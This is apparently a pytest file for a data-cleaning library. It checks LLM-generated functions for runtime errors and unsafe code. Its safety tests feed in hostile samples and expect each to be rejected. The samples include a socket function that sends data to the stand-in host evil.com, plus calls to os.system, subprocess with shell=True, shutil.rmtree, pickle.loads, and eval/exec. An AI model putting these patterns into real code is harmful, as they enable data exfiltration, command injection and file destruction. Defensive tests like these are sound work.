"""Tests for runtime validation of generated functions."""

import pytest
from recursive_cleaner import DataCleaner, validate_function, extract_sample_data, check_code_safety


class MockLLM:
    """Mock LLM that returns predefined responses."""

    def __init__(self, responses: list[str]):
        self.responses = iter(responses)
        self.calls = []

    def generate(self, prompt: str) -> str:
        self.calls.append(prompt)
        return next(self.responses)


# Test validate_function directly

def test_validate_function_accepts_working_code():
    """Function that works on sample data is accepted."""
    code = '''
def process_data(data):
    return data.get("name", "unknown")
'''
    sample_data = [{"name": "Alice"}, {"name": "Bob"}]
    valid, error = validate_function(code, sample_data, "process_data")
    assert valid is True
    assert error is None


def test_validate_function_rejects_key_error():
    """Function with KeyError on nonexistent key is rejected."""
    code = '''
def bad_function(data):
    return data["nonexistent_key"]
'''
    sample_data = [{"name": "Alice"}]
    valid, error = validate_function(code, sample_data, "bad_function")
    assert valid is False
    assert "KeyError" in error


def test_validate_function_rejects_type_error():
    """Function with TypeError is rejected."""
    code = '''
def type_error_func(data):
    return len(data["name"]) + data["name"]  # int + str
'''
    sample_data = [{"name": "Alice"}]
    valid, error = validate_function(code, sample_data, "type_error_func")
    assert valid is False
    assert "TypeError" in error


def test_validate_function_rejects_attribute_error():
    """Function with AttributeError is rejected."""
    code = '''
def attr_error_func(data):
    return data["name"].nonexistent_method()
'''
    sample_data = [{"name": "Alice"}]
    valid, error = validate_function(code, sample_data, "attr_error_func")
    assert valid is False
    assert "AttributeError" in error


def test_validate_function_handles_empty_sample():
    """Empty sample data returns success (nothing to validate against)."""
    code = '''
def some_func(data):
    return data["will_fail"]
'''
    valid, error = validate_function(code, [], "some_func")
    assert valid is True
    assert error is None


def test_validate_function_missing_function_name():
    """Returns error if function name not found in code."""
    code = '''
def actual_name(data):
    return data
'''
    valid, error = validate_function(code, [{"a": 1}], "wrong_name")
    assert valid is False
    assert "not found" in error.lower()


def test_validate_function_syntax_error_in_code():
    """Returns error if code has syntax error."""
    code = '''
def broken_func(data
    return data
'''
    valid, error = validate_function(code, [{"a": 1}], "broken_func")
    assert valid is False
    assert "compilation failed" in error.lower() or "SyntaxError" in error


# Test extract_sample_data

def test_extract_sample_data_jsonl():
    """Extracts JSON objects from JSONL chunk."""
    chunk = '{"name": "Alice"}\n{"name": "Bob"}\n{"name": "Carol"}\n{"name": "Dave"}'
    samples = extract_sample_data(chunk)
    assert len(samples) == 3  # max_samples default is 3
    assert samples[0]["name"] == "Alice"
    assert samples[2]["name"] == "Carol"


def test_extract_sample_data_handles_invalid_lines():
    """Skips invalid JSON lines."""
    chunk = '{"valid": true}\nnot json\n{"also_valid": true}'
    samples = extract_sample_data(chunk)
    assert len(samples) == 2
    assert samples[0]["valid"] is True
    assert samples[1]["also_valid"] is True


def test_extract_sample_data_empty_chunk():
    """Returns empty list for empty chunk."""
    samples = extract_sample_data("")
    assert samples == []


# Test integration with DataCleaner

RESPONSE_WITH_BAD_FUNCTION = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Data needs processing</issue>
  </issues_detected>
  <function_to_generate>
    <name>bad_processor</name>
    <docstring>Tries to access nonexistent key.</docstring>
    <code>
```python
def bad_processor(data):
    return data["nonexistent_field"]
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

RESPONSE_WITH_GOOD_FUNCTION = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Data needs processing</issue>
  </issues_detected>
  <function_to_generate>
    <name>good_processor</name>
    <docstring>Safely processes data.</docstring>
    <code>
```python
def good_processor(data):
    return data.get("name", "unknown")
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

RESPONSE_CLEAN = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="true">Already handled</issue>
  </issues_detected>
  <chunk_status>clean</chunk_status>
</cleaning_analysis>
'''


def test_cleaner_retries_on_validation_failure(tmp_path):
    """DataCleaner retries with error feedback when validation fails."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"name": "Alice"}\n{"name": "Bob"}\n')

    # First response fails validation, second succeeds, third marks clean
    mock_llm = MockLLM([RESPONSE_WITH_BAD_FUNCTION, RESPONSE_WITH_GOOD_FUNCTION, RESPONSE_CLEAN])

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        validate_runtime=True,
    )
    cleaner.run()

    # Should have retried (at least 2 calls)
    assert len(mock_llm.calls) >= 2
    # Second call should include validation error feedback
    assert "validation" in mock_llm.calls[1].lower() or "runtime" in mock_llm.calls[1].lower()
    # Only the good function should be added
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "good_processor"


def test_cleaner_validation_disabled(tmp_path):
    """With validate_runtime=False, bad functions are accepted."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"name": "Alice"}\n')

    mock_llm = MockLLM([RESPONSE_WITH_BAD_FUNCTION, RESPONSE_CLEAN])

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        validate_runtime=False,
    )
    cleaner.run()

    # Bad function should be accepted since validation is disabled
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "bad_processor"


# Tests for check_code_safety


class TestCheckCodeSafety:
    """Tests for dangerous code detection."""

    def test_safe_code_passes(self):
        """Normal data cleaning code is accepted."""
        code = '''
import re
import json

def normalize_phone(data):
    """Normalize phone numbers to E.164 format."""
    phone = data.get("phone", "")
    digits = re.sub(r"\\D", "", phone)
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is True
        assert error is None

    def test_common_safe_imports_allowed(self):
        """Common safe imports for data cleaning are allowed."""
        code = '''
import re
import json
import datetime
import math
import collections
import itertools
from typing import Any

def process(data):
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is True

    # Dangerous imports

    def test_rejects_import_os(self):
        """Rejects import os."""
        code = '''
import os

def delete_files(data):
    os.remove(data["path"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "os" in error

    def test_rejects_from_os_import(self):
        """Rejects from os import ..."""
        code = '''
from os import path

def check_path(data):
    return path.exists(data["file"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "os" in error

    def test_rejects_import_os_path(self):
        """Rejects import os.path."""
        code = '''
import os.path

def check_path(data):
    return os.path.exists(data["file"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "os" in error

    def test_rejects_subprocess(self):
        """Rejects subprocess imports."""
        code = '''
import subprocess

def run_command(data):
    subprocess.run(data["cmd"], shell=True)
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "subprocess" in error

    def test_rejects_sys(self):
        """Rejects sys imports."""
        code = '''
import sys

def mess_with_path(data):
    sys.path.append(data["dir"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "sys" in error

    def test_rejects_shutil(self):
        """Rejects shutil imports."""
        code = '''
import shutil

def delete_dir(data):
    shutil.rmtree(data["dir"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "shutil" in error

    def test_rejects_pathlib(self):
        """Rejects pathlib imports."""
        code = '''
from pathlib import Path

def read_file(data):
    return Path(data["file"]).read_text()
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "pathlib" in error

    def test_rejects_socket(self):
        """Rejects socket imports (network access)."""
        code = '''
import socket

def exfiltrate(data):
    s = socket.socket()
    s.connect(("evil.com", 80))
    s.send(str(data).encode())
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "socket" in error

    def test_rejects_urllib(self):
        """Rejects urllib imports."""
        code = '''
from urllib import request

def fetch(data):
    return request.urlopen(data["url"]).read()
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "urllib" in error

    def test_rejects_pickle(self):
        """Rejects pickle imports (deserialization attacks)."""
        code = '''
import pickle

def load_data(data):
    return pickle.loads(data["payload"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "pickle" in error

    # Dangerous function calls

    def test_rejects_eval(self):
        """Rejects eval() calls."""
        code = '''
def dynamic_code(data):
    return eval(data["expression"])
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "eval" in error

    def test_rejects_exec(self):
        """Rejects exec() calls."""
        code = '''
def run_code(data):
    exec(data["code"])
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "exec" in error

    def test_rejects_compile(self):
        """Rejects compile() calls."""
        code = '''
def compile_code(data):
    compiled = compile(data["code"], "<string>", "exec")
    return compiled
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "compile" in error

    def test_rejects___import__(self):
        """Rejects __import__() calls."""
        code = '''
def dynamic_import(data):
    mod = __import__(data["module"])
    return mod
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "__import__" in error

    def test_rejects_open(self):
        """Rejects open() calls - functions receive data as args."""
        code = '''
def read_file(data):
    with open(data["filename"]) as f:
        return f.read()
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "open" in error

    # Syntax errors

    def test_syntax_error_returns_false(self):
        """Syntax errors are caught and reported."""
        code = '''
def broken(data
    return data
'''
        safe, error = check_code_safety(code)
        assert safe is False
        assert "Syntax error" in error

    # Edge cases

    def test_allows_re_compile(self):
        """re.compile() is not the same as compile() - should be allowed."""
        code = '''
import re

def pattern_match(data):
    pattern = re.compile(r"\\d+")
    return pattern.findall(data.get("text", ""))
'''
        safe, error = check_code_safety(code)
        assert safe is True

    def test_method_calls_not_confused_with_builtins(self):
        """obj.open() should not trigger the open() check."""
        code = '''
def process(data):
    # Some object with an open method
    return data.open()
'''
        safe, error = check_code_safety(code)
        assert safe is True


# Integration test: safety check in DataCleaner

RESPONSE_WITH_DANGEROUS_IMPORT = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Need to process files</issue>
  </issues_detected>
  <function_to_generate>
    <name>dangerous_processor</name>
    <docstring>Dangerously imports os.</docstring>
    <code>
```python
import os

def dangerous_processor(data):
    os.system("echo " + data["cmd"])
    return data
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''

RESPONSE_SAFE_FUNCTION = '''
<cleaning_analysis>
  <issues_detected>
    <issue id="1" solved="false">Need to process data</issue>
  </issues_detected>
  <function_to_generate>
    <name>safe_processor</name>
    <docstring>Safely processes data.</docstring>
    <code>
```python
def safe_processor(data):
    return data.get("value", 0) * 2
```
    </code>
  </function_to_generate>
  <chunk_status>needs_more_work</chunk_status>
</cleaning_analysis>
'''


def test_cleaner_rejects_dangerous_code_and_retries(tmp_path):
    """DataCleaner rejects dangerous code and retries with feedback."""
    test_file = tmp_path / "test.jsonl"
    test_file.write_text('{"value": 42}\n')

    # First response has dangerous import, second is safe, third marks clean
    mock_llm = MockLLM([RESPONSE_WITH_DANGEROUS_IMPORT, RESPONSE_SAFE_FUNCTION, RESPONSE_CLEAN])

    events = []

    def track_events(e):
        events.append(e)

    cleaner = DataCleaner(
        llm_backend=mock_llm,
        file_path=str(test_file),
        chunk_size=10,
        on_progress=track_events,
    )
    cleaner.run()

    # Should have retried
    assert len(mock_llm.calls) >= 2
    # Retry prompt should mention safety
    assert "safety" in mock_llm.calls[1].lower()
    # Only safe function accepted
    assert len(cleaner.functions) == 1
    assert cleaner.functions[0]["name"] == "safe_processor"
    # Safety failure event emitted
    safety_events = [e for e in events if e["type"] == "safety_failed"]
    assert len(safety_events) == 1
    assert "os" in safety_events[0]["error"]
